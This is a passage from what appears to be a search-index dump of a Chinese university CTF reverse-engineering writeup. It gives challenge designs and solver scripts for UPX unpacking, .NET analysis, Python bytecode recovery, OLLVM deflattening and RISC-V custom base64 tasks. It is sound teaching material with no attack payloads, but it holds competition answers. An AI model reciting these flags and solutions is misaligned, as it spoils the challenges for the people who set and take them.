[ 17 ] = \"pbm`KkL`dKQ2KeJLd\" ; char theflag [ 17 ]; char flag [ 17 ] = \"scu_ctf_f4k3_f14g\" ; int i = 0 ; for ( i = 0 ; i < 17 ; i ++ ) theflag [ i ] = fstr [ i ] * 2 - flag [ i ]; for ( i = 0 ; i < 17 ; i ++ ) printf ( \"%c\" , theflag [ i ]); } \u6cd52 \u00b6 \u524d\u9762\u6b65\u9aa4\u4e00\u76f4\uff0c\u540e\u9762\u76f4\u63a5angr\u68ad\u54c8 import angr p = angr . Project ( 'sign.exe' , auto_load_libs = False ) st = p . factory . call_state ( addr = 0x401520 , add_options = angr . options . unicorn ) sim = p . factory . simgr ( st ) sim . explore ( find = 0x40155e , avoid = 0x40156c ) print ( sim . one_found . posix . dumps ( 0 )) \u8fd9\u4e2a\u5730\u65b9\u5c31\u53ef\u4ee5\u770b\u51fa\uff0c\u6709\u591a\u89e3\u60c5\u51b5\u4e86\u3002 \u592a\u7a7a\u5927\u6218 \u00b6 \u51fa\u9898\u601d\u8def \u00b6 \u8fd9\u9898\u662f\u7531God sun\u51fa\u7684\uff0c\u5927\u6982\u4e3b\u8981\u8003\u5bdf\u4e00\u4e2a.net\uff0c\u52a0\u4e4b\u8ba9\u6bd4\u8d5b\u53d8\u7684\u66f4\u6709\u8da3\u4e00\u70b9\uff0c\u653e\u4e86\u4e2a\u5c0f\u6e38\u620f\u4e0a\u53bb\u3002\u53ea\u8981\u6253\u5b8c180\u4e2a\u7070\u673a\uff08\u4e00\u4e2a\u4e0d\u843d\uff09\u63a7\u5236\u53f0\u5c31\u4f1a\u8f93\u51faflag \uff08180\u4e2a\u98de\u673a\uff0c\u65e0\u9700\u9006\u5411\uff0c\u8f7b\u8f7b\u677e\u677e\u5c31\u53ef\u4ee5\u6253\u8d25\u3002 \u89e3\u9898\u65b9\u6cd5 \u00b6 \u5173\u952e\u4ee3\u7801\u5728assets/bin/Date/Managed/Assembly-CSharp.dll \u2f64.NET Reflector\u6253\u5f00\u5206\u6790 \u7ecf\u8fc7\u5206\u6790\u53ef\u4ee5\u5f97\u77e5\uff0c\u6bcf\u51fb\u843d\u4e00\u67b6\u5206\u7ea7\uff0c\u8c03\u7528\u4e00\u6b21\u8fd9\u4e2a\u5173\u952e\u65b9\u6cd5\u3002\u7531\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\u603b\u5171\u9700\u8981\u6467\u6bc1\u4e86180\u4e2a\u3002\uff08\u5176\u5b9e\u603b\u5171\u4e5f\u5c31180\u4e2a\uff09 \u5199\u89e3\u9898\u811a\u672c import hashlib mask = [ 49552 , 26516 , 15988 , 29987 , 52902 , 33151 , 8086 , 39920 , 3604 , 21497 , 19862 , 12268 , 50822 , 26111 , 35391 , 20661 , 6370 , 14029 , 26707 , 42890 , 19391 , 13836 , 61102 , 38705 , 45159 , 12927 , 47794 , 39183 , 20776 , 44532 , 18925 , 4854 , 60596 , 11941 , 28994 , 11166 , 57586 , 48918 , 13199 , 42006 , 62781 , 31480 , 50464 , 53893 , 21233 , 61456 , 55842 , 46591 , 10574 , 45253 , 50991 , 44866 , 45945 , 17105 , 27273 , 18925 , 41001 , 64310 , 51846 , 46279 , 14977 , 61079 , 26330 , 1192 , 61190 , 38989 , 36161 , 17001 , 38576 , 49567 , 55929 , 31759 , 54550 , 12759 , 13756 , 60929 , 36365 , 27308 , 57132 , 42483 , 42263 , 57086 , 55839 , 13568 , 37191 , 18388 , 34592 , 4189 , 65492 , 24673 , 27016 , 6941 , 33229 , 4180 , 35454 , 64874 , 36708 , 22948 ] l = len ( mask ) secret = \"jFEQ6xFkUxKGzUbn\" for i in range ( 1 , 181 ): secret = hashlib . md5 (( secret + str ( mask [ i % l ])) . encode ()) . hexdigest () if '6a37460f25c719a4' in secret : print ( secret [ 0 : 16 ]) \u6ce8\u610f\u8fd9\u91cc\u5f88\u591a\u9009\u624b\u4ee5\u4e3a\u53ea\u8c03\u7528\u4e00\u6b21\uff0c\u6240\u4ee5\u76f4\u63a5\u62ff180%98 \u53bb\u5904\u7406\uff0c\u7b97\u51fa\u6765\u7684\u662f\u9519\u7684\u3002 PY \u4ea4\u6613 \u00b6 \u51fa\u9898\u601d\u8def \u00b6 \u8fd9\u4e2a\u9898\u76ee\u51fa\u9898\u4e3b\u8981\u60f3\u8003\u5bdf\u4e00\u4e0bpython\u7684\u9006\u5411\uff0c\u6821\u5185\u6253\u6821\u5916\u6bd4\u8d5b\u7684\u4e0d\u591a\uff0c\u89c1\u5f97\u9898\u76ee\u76f8\u5bf9\u8f83\u5c11\u3002\u6240\u4ee5\u672c\u7740\u62d3\u5bbd\u5b66\u4e60\u7684\u76ee\u7684\uff0c\u51fa\u4e86\u8fd9\u9053\u8fd8\u539f\u5b57\u8282\u7801\u7684\u9898\u76ee\u3002\u76f8\u5bf9\u6765\u8bf4\u8fd9\u9053\u9898\u4e0d\u662f\u592a\u96be\uff0c\u901a\u8fc7\u76f8\u5173\u535a\u5ba2\u641c\u7d22\uff0c\u7136\u540e\u4e00\u6b65\u6b65\u5206\u6790\u8fd8\u539f\uff0c\u8fd8\u539f\u540edis\u68c0\u9a8c\u3002 \u53c2\u8003\u6587\u7ae0 https://bbs.pediy.com/thread-246683.htm \u89e3\u9898\u65b9\u6cd5 \u00b6 \u9996\u5148\u76f4\u63a5\u8fd8\u539fpython\u4ee3\u7801\u5c31\u597d\u4e86\uff0c\u8fd8\u539f\u7ed3\u679c\u5982\u4e0b inputs = input ( \"please your flag:\" ) inputs = inputs [ 7 : - 1 ] flag = \"th31_scuctf_eXclus1v3\" theflag = \"\" i = 0 j = 0 print ( flag [ 0 ]) if ( len ( flag ) != len ( inputs )): print ( \"Error!\" ) for i in range ( 0 , len ( flag ) - 14 ): theflag += ( chr ( ord ( flag [ i ]) + ord ( inputs [ i + 8 ]))) for i in range ( 10 , len ( flag ) - 6 ): theflag += ( chr ( ord ( flag [ i ]) + ord ( inputs [ i - 8 ]))) j = i + 1 for i in range ( j , len ( flag )): theflag += ( chr ( ord ( flag [ i - 3 ]) + ord ( inputs [ i ]))) flags = list ( theflag ) for i in range ( 0 , len ( flags ) // 2 ): flags [ i ] = chr ( ord ( flags [ i ]) + 20 ) #Flag scuctf{} #The flag text starts with \"d1\" and the eighth bit is \"3\" flagt = flags [ len ( flags ) // 2 : len ( flags )] theflag = \"\" . join ( flagt ) for k in range ( 0 , len ( flags ) // 2 ): theflag += \"\" . join ( flags [ k ]) if ( theflag == '\u00d7 \\x8b \u00d9\u00cd \\x8c \u00d3\u00dc\u00ee\u00a4\u00fa\u00b1\u00ac\u00a4\u00a4\u00fa\u00d6\u00ed\u00d2' ): print ( \"You win!\" ) else : print ( \"Error!!!\" ) \u63a5\u7740\u5c31\u662f\u9006\u5411\u5206\u6790\uff0c\u5199\u89e3\u9898\u811a\u672c \u6cd51 \u00b6 enflag = '\u00d7 \\x8b \u00d9\u00cd \\x8c \u00d3\u00dc\u00ee\u00a4\u00fa\u00b1\u00ac\u00a4\u00a4\u00fa\u00d6\u00ed\u00d2' flag = 'th31_scuctf_eXclus1v3' ans = 'd1' + '*' * 19 step1 = enflag [ 9 :] + enflag [ 0 : 9 ] theflag = '' for i in range ( 0 , 9 ): theflag += chr ( ord ( step1 [ i ]) - 20 ) theflag += step1 [ 9 :] inputs = list ( ans ) for i in range ( 0 , 7 ): inputs [ i + 8 ] = chr ( ord ( theflag [ i ]) - ord ( flag [ i ])) for i in range ( 10 , 15 ): inputs [ i - 8 ] = chr ( ord ( theflag [ i - 3 ]) - ord ( flag [ i ])) for i in range ( 15 , 21 ): inputs [ i ] = chr ( ord ( theflag [ i - 3 ]) - ord ( flag [ i - 3 ])) inputs [ 7 ] = '3' print ( 'scuctf{' + '' . join ( inputs ) + '}' ) \u6cd52 \u00b6 from z3 import * flag = \"th31_scuctf_eXclus1v3\" dist = \"\u00d7\u008b\u00d9\u00cd\u008c\u00d3\u00dc\u00ee\u00a4\u00fa\u00b1\u00ac\u00a4\u00a4\u00fa\u00d6\u00ed\u00d2\" inp = [ BitVec (( 'x %s ' % i ), 8 ) for i in range ( len ( flag ))] theflag = [] for i in range ( 0 , len ( flag ) - 14 ): theflag . append ( ord ( flag [ i ]) + inp [ i + 8 ]) for i in range ( 10 , len ( flag ) - 6 ): theflag . append ( ord ( flag [ i ]) + inp [ i - 8 ]) for i in range ( len ( flag ) - 6 , len ( flag )): theflag . append ( ord ( flag [ i - 3 ]) + inp [ i ]) flags = [ _ for _ in theflag ] for i in range ( len ( flags ) // 2 ): flags [ i ] = flags [ i ] + 20 theflag = theflag [ len ( flags ) // 2 :] for i in range ( len ( flags ) // 2 ): theflag . append ( flags [ i ]) solver = Solver () for i in zip ( theflag , dist ): solver . append ( i [ 0 ] == ord ( i [ 1 ])) solver . check () model = solver . model () for i , v in enumerate ( inp ): try : print ( chr ( model [ v ] . as_long ()), end = '' ) except : print ( ' ' , end = '' ) \u9898\u76ee\u524d\u4e24\u4f4d\u548c\u7b2c\u516b\u4f4d\u65e0\u6cd5\u89e3\u9664\uff0c\u9898\u76ee\u4e2d\u5df2\u7ecf\u63d0\u793a\u5177\u4f53\u5b57\u7b26 ONIbase64 \u00b6 \u51fa\u9898\u601d\u8def \u00b6 \u672c\u9053\u9898\u4e3b\u8981\u5c31\u662f\u8003\u5bdf\u4e00\u4e2aollvm\u5e73\u5766\u5316\u3002\u4e5f\u6ca1\u60f3\u5230\u8fd9\u4e48\u60e8\u70c8\u3002 \u89e3\u9898\u65b9\u6cd5 \u00b6 \u6587\u4ef6\u62c9\u5230\u6700\u540e\u5c31\u53ef\u4ee5\u770b\u5230\u7f16\u8bd1\u5668\u5730\u5740\uff0c\u76f4\u63a5\u628a\u5b83pull\u4e0b\u6765\uff0c\u7f16\u8bd1.s\u6587\u4ef6\u5f97\u5230\u53ef\u6267\u884c\u6587\u4ef6\u3002 \u62d6\u5165IDA\u5206\u6790\uff0c\u662f\u4e2a\u6807\u51c6\u7684\u5e73\u5766\u5316\u3002 \u53c2\u8003 https://github.com/pcy190/deflat \u53bb\u9664\u5e73\u5766\u5316 \u7136\u540e\u76f4\u63a5F5\u5199\u89e3\u5bc6\u811a\u672c from z3 import * from functools import reduce table = 'ZAnUX1W2oPNQ4sBMOd/+ChfGI5r8Hvt3uaLkbDgcyJYTipez6mxF0SEqRjVKwl97' coding = '5auRs6a4A2lEUObG5+uoPGuWHnimZLXtvkyEHxCFoal5' dist = map ( lambda x : BitVecVal ( table . find ( x ), 6 ), coding ) flag = [ BitVec ( 'c %d ' % i , 8 ) for i in range ( 32 )] total = Concat ( flag ) s = [ Extract ( 32 * ( i + 1 ) - 1 , 32 * i , total ) for i in range ( 8 )] temps = reduce ( lambda x , y : x ^ y , s , 0 ) s = [ i ^ temps for i in s ] s . reverse () total = Concat ( s ) bits = [ Extract ( 8 * ( i + 1 ) - 1 , 8 * i , total ) for i in range ( 32 )] bits = bits + [ reduce ( lambda x , y : x ^ y , bits )] tup = [ bits [ i : i + 3 ] for i in range ( 0 , len ( bits ), 3 )] outs = [] padding = BitVecVal ( 0 , 2 ) for i , v in enumerate ( tup ): t = Concat ( v ) s1 = Extract ( 23 , 18 , t ) s2 = Extract ( 17 , 12 , t ) s3 = Extract ( 11 , 6 , t ) s4 = Extract ( 5 , 0 , t ) outs . append ( s1 ) outs . append ( s2 ) outs . append ( s3 ) outs . append ( s4 ) for v2 in tup [ i + 1 :]: v2 [ 0 ] = v2 [ 0 ] ^ Concat ( padding , s1 ) v2 [ 1 ] = v2 [ 1 ] ^ Concat ( padding , s2 ) v2 [ 2 ] = v2 [ 2 ] ^ Concat ( padding , s3 ) solve = Solver () for i , v in enumerate ( dist ): solve . add ( outs [ i ] == v ) solve . check () model = solve . model () print ( '' . join ( map ( lambda x : chr ( model . eval ( x , 8 ) . as_long ()), reversed ( flag )))) easy_re&easy_base \u00b6 \u51fa\u9898\u601d\u8def \u00b6 \u65e2\u7136\u8981\u641e\u82b1\u6837\uff0c\u5f53\u7136\u5c11\u4e0d\u5f53\u4eca\u6700\u706b\u7684iot\u3002\u91c7\u7528\u817e\u8bafTencentOS tiny \u5b98\u65b9\u5b9a\u5236IoT\u5f00\u53d1\u677fEVB_LX(\u6682\u65f6\u662f\u9650\u91cf\u7684)\u7f16\u8bd1\u73af\u5883\uff1a https://github.com/Tencent/TencentOS-tiny \u4e24\u4e2a\u9898\u76ee\uff0c\u90fd\u662f\u8003\u5bdf\u627e\u5230\u88ab\u66ff\u6362\u7684base64\u5bc6\u7801\u8868\uff0c\u7531\u4e8e\u8003\u8651\u5230\u76f4\u63a5\u4e0abase\u6709\u70b9\u96be\uff0c\u6240\u4ee5\u51fa\u4e86\u4e00\u4e2aeasy_re\u8fc7\u6e21\u3002 \u4e24\u4e2a\u9898\u76ee\u66ff\u6362\u90fd\u6d89\u53ca\u56db\u6bb5\u5b57\u7b26\u5982\u4e0b\uff08\u628a\u521d\u59cb\u5bc6\u7801\u8868\u62c6\u5206\u4e3a\u56db\u6bb5\uff09\uff1a \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" \"abcdefghijklmnopqrstuvwxyz\" \"0123456789\" \"+/\" easy_re\u662f\u6539\u53d8\u4e86\u8fd9\u56db\u6bb5\u5b57\u7b26\u538b\u6808\u987a\u5e8f\u3002\u6ca1\u60f3\u5230ida\u592a\u8fc7\u4e8e\u667a\u80fd\u5316\uff0c\u663e\u793a\u7ed3\u679c\u5373\u662f\u6b63\u786e\u538b\u6808\u987a\u5e8f\u3002 easy_base\u8003\u5bdf\u504f\u96be\u4e86\uff0c\u4e3b\u8981\u662f\u5bf9\u8fd9\u56db\u6bb5\u5b57\u7b26\u8fdb\u884c\u4e86\u4e00\u4e9b\u53d8\u6362\uff0c\u5982\u679c\u9006\u5411\u5206\u6790\u7684\u8bdd\u9700\u8981\u5b66\u4e60risc-v\u6307\u4ee4\u96c6\u3002 \u5f53\u7136\uff0c\u8fd9\u4e24\u4e2a\u9898\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u628a\u7a0b\u5e8f\u653e\u5165\u5bf9\u5e94\u5f00\u53d1\u677f\u91cc\uff0c\u4ed6\u76f8\u5e94\u7684\u4e32\u53e3\u4e5f\u4f1a\u8f93\u51fa\u5b57\u6bcd\u8868\u3002 \u505a\u9898\u8fc7\u7a0b\u4e2d\u4e5f\u53d1\u73b0\u4e00\u4e9b\u9009\u624b\u62ff\u5230\u9898\u76ee\u76f4\u63a5\u731c\u6d4barm\u67b6\u6784\uff0c\u62ff\u7740ida \u5f53arm\u5206\u6790\uff0c\u8fd8\u539f\u7684\u5185\u5bb9\u662f\u9519\u7684\uff0c\u65e0\u4ece\u4e0b\u624b\u3002\u5982\u679c\u62ff\u5230\u6587\u4ef6\u540eFile\u4e00\u4e0b\u4e5f\u4f1a\u77e5\u9053\u662frisc-v\u67b6\u6784\u3002\u4e0d\u81f3\u4e8e\u8d70\u504f\u3002 \u89e3\u9898\u65b9\u6cd5 \u00b6 \u9996\u5148\uff0cida\u9ed8\u8ba4\u4e0d\u652f\u6301risc-v\uff0c\u6240\u4ee5\u9700\u8981\u4e0b\u8f7d\u76f8\u5173\u63d2\u4ef6\u3002 https://github.com/lcq2/riscv-ida \u7136\u540e\uff0cida\u6253\u5f00\u5206\u6790\uff0c\u76f4\u63a5\u5c31\u6709\u6b63\u786e\u7684\u5b57\u6bcd\u8868\u538b\u6808\u987a\u5e8f\uff0c\uff08\u539f\u672c\u662f\u60f3\u8ba9\u9009\u624b\u5206\u6790\u7b80\u5355\u6307\u4ee4\u6765\u786e\u5b9a\u6216\u8005\u7206\u7834\uff09 \u5f97\u5230 \u5b57\u6bcd\u8868\u5c31\u5f88\u5bb9\u6613\u89e3\u51fa\u6765\u4e86 import base64 str1 = \"PalXPrhnOrLZT6PVQJ1oNr9dSqDVTbo==\" string1 = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/abcdefghijklmnopqrstuvwxyz\" string2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" print ( base64 . b64decode ( str1 . translate ( str . maketrans ( string1 , string2 )))) easy_base \u7684\u8bdd\u5c31\u9700\u8981\u5206\u6790\u6307\u4ee4\u5f97\u51fa\u5177\u4f53\u64cd\u4f5c\u6216\u8005\u76f4\u63a5\u5f00\u53d1\u677f\u8dd1\u4e00\u4e0b\u5f97\u5230\u8f93\u51fa \u770b\u5230\u5927\u591a\u6570\u4eba\u89e3\u9898\u65e0\u679c\uff0c\u6bd4\u8d5b\u6700\u540e\u653e\u51fa\u4e86\u4e00\u4e2arisc-v 64\u4f4d\u7684\u9644\u4ef6\uff08\u4ee3\u7801\u4e00\u6837\uff09\uff0c\u901a\u8fc7docker\u8dd1\u5373\u53ef\u5f97\u5230table\u3002 \u7136\u540e\u76f4\u63a5\u89e3\u5bc6\u5f97\u5230flag import base64 str1 = \"UoH+U/DJV/YlQdUOU94JPYxJgdHMUWK=\" string1 = \"a0b1c2d3e4f5g6h7i8j9ZYXWVUTSRQPON+klmnopqrABCDEFGHIJKLM/stuvwxyz\" string2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" print ( base64 . b64decode ( str1 . translate ( str . maketrans ( string1 , string2 )))) \u5982\u679c\u5bf9\u9898\u76ee\u611f\u5174\u8da3\u7684\uff0c\u53ef\u4ee5\u4e4b\u540e\u518d\u7814\u7a76\u3002\u6211\u9644\u4e0a\u9898\u76ee\u4e3b\u6587\u4ef6\u6e90\u4ee3\u7801 #include \"mcu_init.h\" #include \"tos_k.h\" #define TASK_SIZE 1024 k_task_t k_task_task1 ; k_task_t k_task_task2 ; uint8_t k_task1_stk [ TASK_SIZE ]; uint8_t k_task2_stk [ TASK_SIZE ]; int share = 0xCBA7F9 ; k_sem_t sem ; unsigned char * scuctf_flag_base64 = \"UoH+U/DJV/YlQdUOU94JPYxJgdHMUWK=\" ; unsigned char base64_right [ 65 ] = \"\" ; void scuctf_base64 ( void ) { unsigned char base64_1 [ 26 ] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" ; unsigned char base64_2 [ 26 ] = \"abcdefghijklmnopqrstuvwxyz\" ; unsigned char base64_3 [ 10 ] = \"0123456789\" ; unsigned char base64_4 [ 2 ] = \"+/\" ; int i = 0 , j = 0 , k = 0 , q = 25 , r = 10 , n = 0 ; for ( i = 0 ; i < 20 ;) { base64_right [ i ] = base64_2 [ j ]; j ++ ; base64_right [ i + 1 ] = base64_3 [ k ]; k ++ ; i += 2 ; } for ( i = 20 ; i < 33 ; i ++ ) { base64_right [ i ] = base64_1 [ q ]; q -- ; } for ( i = 33 ; i < 42 ; i ++ ) { if ( i == 33 ) { base64_right [ 33 ] = base64_4 [ 0 ]; } else { base64_right [ i ] = base64_2 [ r ]; r ++ ; } } for ( i = 42 ; i < 64 ; i ++ ) { if ( n < 13 ) { base64_right [ i ] = base64_1 [ n ]; n ++ ; } else { if ( i == 55 ) { base64_right [ i ] = base64_4 [ 1 ]; } else { base64_right [ i ] = base64_2 [ r ]; r ++ ; } } } } void task1 ( void * pdata ) { int task_cnt1 = 0 ; while ( 1 ) { printf ( \"welcome scuctf from %s cnt: %d \\n \" , __func__ , task_cnt1 ++ ); tos_sem_pend ( & sem , ~ 0U ); gpio_bit_write ( GPIOA , GPIO_PIN_7 , share % 2 ); } } void task2 ( void * pdata ) { int task_cnt2 = 0 ; scuctf_base64 (); while ( 1 ) { share ++ ; for ( int i = 0 ; i < 5 ; i ++ ) { printf ( \"Where is scuctf_base64? %s cnt: %08x \\n %s\" , __func__ , task_cnt2 -- , base64_right ); tos_task_delay ( 50 ); } tos_sem_post ( & sem ); } } void main ( void ) { board_init (); usart0_init ( 115200 ); tos_knl_init (); tos_task_create ( & k_task_task1 , \"task1\" , task1 , NULL , 3 , k_task1_stk , TASK_SIZE , 0 ); tos_task_create ( & k_task_task2 , \"task2\" , task2 , NULL , 3 , k_task2_stk , TASK_SIZE , 0 ); k_err_t err = tos_sem_create ( & sem , 1 ); if ( err != K_ERR_NONE ) { goto die ; } tos_knl_start (); die : while ( 1 ) { asm ( \"wfi;\" ); } } int _put_char ( int ch ) { usart_data_transmit ( USART0 , ( uint8_t ) ch ); while ( usart_flag_get ( USART0 , USART_FLAG_TBE ) == RESET ){ } return ch ; } \u53c2\u8003 https://github.com/riscv/riscv-isa-manual/releases \u5c0f\u7ed3 \u00b6 \u7531\u4e8e\u662f\u666e\u901a\u6821\u8d5b\uff0c\u9898\u76ee\u4e5f\u6ca1\u51fa\u8fc7\u5206\u96be\uff0c\u4e2a\u4eba\u611f\u89c9\u96be\u4ee5\u628a\u63e1\u8fd8\u7b97\u53ef\u4ee5\u3002\u8fd9\u6b21\u9898\u76ee\u4e3b\u8981\u4e5f\u672c\u7740\u6253\u7834\u4f20\u7edfscuctf \u5e38\u89c4\u9898\u76ee\uff0c\u4e00\u4e22\u4e22\u5c0f\u5c0f\u7684\u521b\u65b0\u3002 .NET\uff0crisc-v\uff0collvm\uff0capk\uff0cpython\u7b49\u3002\u5373\u4f7f\u8fd9\u4e9b\u53ef\u80fd\u5728\u5168\u56fdctf\u4e2d\u662f\u5e38\u89c1\u9898\u76ee\uff0c\u4f46\u662f\u611f\u89c9\u6821\u5185\u8fd8\u662f\u51e0\u4e4e\u6ca1\u51fa\u7684\u3002\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u4e5f\u53d1\u751f\u4e86\u5f88\u591a\u8da3\u5473\u4e1c\u897f\uff0c\u6bd4\u5982\u7b2c\u4e00\u9898\u4e00\u9898\u591a\u89e3\uff0cflag\u8bbe\u7f6e\u65f6\u5019\u591a\u52a0\u4e86\u7a7a\u683c\u5bfc\u81f4\u9009\u624b\u63d0\u4ea4\u62a5\u9519\u7b49\u597d\u591a\u95ee\u9898\u3002 \u603b\u4e4b\u5e0c\u671bscuctf\u8d8a\u6765\u8d8a\u6709\u8da3\uff0c\u53c2\u4e0e\u4eba\u6570\u8d8a\u6765\u8d8a\u591a\u5427\uff01","title":"Reverse"},{"location":"WriteUp/202005/Reverse/#reverse","text":"","title":"Reverse"},{"location":"WriteUp/202005/Reverse/#_1","text":"","title":"\u771f\u6b63\u7684\u7b7e\u5230"},{"location":"WriteUp/202005/Reverse/#_2","text":"\u672c\u8eab\u4f5c\u4e3a\u7b7e\u5230\u9898\u5c31\u6ca1\u5fc5\u8981\u592a\u5201\u96be\u4eba\uff0c\u4e3b\u8981\u8003\u5bdf\u8131\u538b\u7f29\u58f3\uff08re\u9009\u624b\u57fa\u7840\u6280\u80fd\uff09\uff0c\u6b63\u597d\u57284\u6708\u7684\u8131\u58f3\u5206\u4eab\u4f1a\u4e5f\u8bf4\u4e86\u8981\u51fa\u4e00\u9053\u8fd9\u79cd\u9898\u3002\u8131\u5b8c\u58f3\u540e\u5c31\u6253\u7b97\u641e\u4e2a\u7b80\u5355\u7684\u52a0\u51cf\u4e58\u9664\uff0c\u4f46\u662f\u8fd8\u662f\u51fa\u9898\u65f6\u5019\u8003\u8651\u4e0d\u5468\uff0c\u51fa\u73b0\u4e86\u591a\u89e3\u7684\u60c5\u51b5\u3002\uff08\u6309\u7167\u6b63\u5e38\u601d\u8def\u4e00\u822c\u90fd\u662f\u4e00\u4e2a\u89e3\u3002\uff09 \u95ee\u9898\u4e3b\u8981\u51fa\u5728\u5f53\u65f6\u505a\u4e86\u4e00\u4e2a\u9664\u6cd5\u7684\u64cd\u4f5c\uff0c\u56e0\u4e3aC\u8bed\u8a00\u4e2d5/2 \u4e0e4/2\u90fd\u4e3a2\u3002","title":"\u51fa\u9898\u601d\u8def"},{"location":"WriteUp/202005/Reverse/#_3","text":"","title":"\u89e3\u9898\u65b9\u6cd5"},{"location":"WriteUp/202005/Reverse/#1","text":"\u7b2c\u4e00\u6b65\uff0c\u67e5\u58f3\uff0c\u53d1\u73b0\u4e3aupx\u3002 \u76f4\u63a5\u53ef\u4ee5\u7528\u8131\u58f3\u8f6f\u4ef6\u8131\u58f3\u4e5f\u53efesp\u5b9a\u5f8b\u7b49\u624b\u52a8\u8131\u58f3\u3002 \u8131\u58f3\u540e\u5206\u6790\u4ee3\u7801\u3002 \u76f4\u63a5\u5199\u811a\u672c #include <stdio.h> #include <string.h> int main (){ char fstr [ 17 ] = \"pbm`KkL`dKQ2KeJLd\" ; char theflag [ 17 ]; char flag [ 17 ] = \"scu_ctf_f4k3_f14g\" ; int i = 0 ; for ( i = 0 ; i < 17 ; i ++ ) theflag [ i ] = fstr [ i ] * 2 - flag [ i ]; for ( i = 0 ; i < 17 ; i ++ ) printf ( \"%c\" , theflag [ i ]); }","title":"\u6cd51"},{"location":"WriteUp/202005/Reverse/#2","text":"\u524d\u9762\u6b65\u9aa4\u4e00\u76f4\uff0c\u540e\u9762\u76f4\u63a5angr\u68ad\u54c8 import angr p = angr . Project ( 'sign.exe' , auto_load_libs = False ) st = p . factory . call_state ( addr = 0x401520 , add_options = angr . options . unicorn ) sim = p . factory . simgr ( st ) sim . explore ( find = 0x40155e , avoid = 0x40156c ) print ( sim . one_found . posix . dumps ( 0 )) \u8fd9\u4e2a\u5730\u65b9\u5c31\u53ef\u4ee5\u770b\u51fa\uff0c\u6709\u591a\u89e3\u60c5\u51b5\u4e86\u3002","title":"\u6cd52"},{"location":"WriteUp/202005/Reverse/#_4","text":"","title":"\u592a\u7a7a\u5927\u6218"},{"location":"WriteUp/202005/Reverse/#_5","text":"\u8fd9\u9898\u662f\u7531God sun\u51fa\u7684\uff0c\u5927\u6982\u4e3b\u8981\u8003\u5bdf\u4e00\u4e2a.net\uff0c\u52a0\u4e4b\u8ba9\u6bd4\u8d5b\u53d8\u7684\u66f4\u6709\u8da3\u4e00\u70b9\uff0c\u653e\u4e86\u4e2a\u5c0f\u6e38\u620f\u4e0a\u53bb\u3002\u53ea\u8981\u6253\u5b8c180\u4e2a\u7070\u673a\uff08\u4e00\u4e2a\u4e0d\u843d\uff09\u63a7\u5236\u53f0\u5c31\u4f1a\u8f93\u51faflag \uff08180\u4e2a\u98de\u673a\uff0c\u65e0\u9700\u9006\u5411\uff0c\u8f7b\u8f7b\u677e\u677e\u5c31\u53ef\u4ee5\u6253\u8d25\u3002","title":"\u51fa\u9898\u601d\u8def"},{"location":"WriteUp/202005/Reverse/#_6","text":"\u5173\u952e\u4ee3\u7801\u5728assets/bin/Date/Managed/Assembly-CSharp.dll \u2f64.NET Reflector\u6253\u5f00\u5206\u6790 \u7ecf\u8fc7\u5206\u6790\u53ef\u4ee5\u5f97\u77e5\uff0c\u6bcf\u51fb\u843d\u4e00\u67b6\u5206\u7ea7\uff0c\u8c03\u7528\u4e00\u6b21\u8fd9\u4e2a\u5173\u952e\u65b9\u6cd5\u3002\u7531\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\u603b\u5171\u9700\u8981\u6467\u6bc1\u4e86180\u4e2a\u3002\uff08\u5176\u5b9e\u603b\u5171\u4e5f\u5c31180\u4e2a\uff09 \u5199\u89e3\u9898\u811a\u672c import hashlib mask = [ 49552 , 26516 , 15988 , 29987 , 52902 , 33151 , 8086 , 39920 , 3604 , 21497 , 19862 , 12268 , 50822 , 26111 , 35391 , 20661 , 6370 , 14029 , 26707 , 42890 , 19391 , 13836 , 61102 , 38705 , 45159 , 12927 , 47794 , 39183 , 20776 , 44532 , 18925 , 4854 , 60596 , 11941 , 28994 , 11166 , 57586 , 48918 , 13199 , 42006 , 62781 , 31480 , 50464 , 53893 , 21233 , 61456 , 55842 , 46591 , 10574 , 45253 , 50991 , 44866 , 45945 , 17105 , 27273 , 18925 , 41001 , 64310 , 51846 , 46279 , 14977 , 61079 , 26330 , 1192 , 61190 , 38989 , 36161 , 17001 , 38576 , 49567 , 55929 , 31759 , 54550 , 12759 , 13756 , 60929 , 36365 , 27308 , 57132 , 42483 , 42263 , 57086 , 55839 , 13568 , 37191 , 18388 , 34592 , 4189 , 65492 , 24673 , 27016 , 6941 , 33229 , 4180 , 35454 , 64874 , 36708 , 22948 ] l = len ( mask ) secret = \"jFEQ6xFkUxKGzUbn\" for i in range ( 1 , 181 ): secret = hashlib . md5 (( secret + str ( mask [ i % l ])) . encode ()) . hexdigest () if '6a37460f25c719a4' in secret : print ( secret [ 0 : 16 ]) \u6ce8\u610f\u8fd9\u91cc\u5f88\u591a\u9009\u624b\u4ee5\u4e3a\u53ea\u8c03\u7528\u4e00\u6b21\uff0c\u6240\u4ee5\u76f4\u63a5\u62ff180%98 \u53bb\u5904\u7406\uff0c\u7b97\u51fa\u6765\u7684\u662f\u9519\u7684\u3002","title":"\u89e3\u9898\u65b9\u6cd5"},{"location":"WriteUp/202005/Reverse/#py","text":"","title":"PY 